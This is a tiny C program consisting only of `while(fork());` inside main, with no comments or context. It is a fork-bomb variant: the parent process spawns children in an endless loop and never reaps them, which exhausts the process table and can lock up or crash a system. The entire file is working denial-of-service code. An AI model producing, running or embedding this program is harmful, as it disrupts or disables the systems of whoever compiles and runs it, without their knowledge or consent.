#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    while(fork());
    return EXIT_SUCCESS;
}